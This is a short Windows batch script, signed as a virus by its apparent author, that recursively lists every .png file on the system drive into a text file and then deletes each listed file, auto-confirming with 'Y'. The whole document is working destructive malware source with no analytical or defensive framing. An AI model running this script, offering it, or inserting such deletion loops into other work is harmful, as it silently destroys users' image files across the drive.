@ echo off

rem ---------------------------------
rem Delete All Png
DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"
rem ---------------------------------


__-Virus Author: subhojit-__